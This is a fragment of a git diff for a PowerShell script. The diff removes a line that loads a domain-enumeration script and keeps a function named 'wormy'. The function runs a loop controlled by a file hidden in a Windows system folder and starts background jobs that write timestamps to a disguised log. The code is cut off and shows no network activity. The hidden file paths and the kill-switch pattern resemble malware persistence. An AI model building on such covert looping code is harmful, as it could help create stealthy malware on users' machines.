@@ -1,5 +1,4 @@
-﻿$code = Get-Content -Path C:\Windows\EnumerateDomain.ps1 | out-null
-function wormy{
+﻿function wormy{
 
 while((get-content 'C:\Program Files (x86)\Windows NT\TableTextService\TableTextServiceDa.txt' -tail 1 ) -ne 'xr'){
 start-job -Scriptblock{[int][double]::Parse((get-date -UFormat %s)) | out-file -FilePath 'C:\Users\Public\Downloads\desktop.log'}
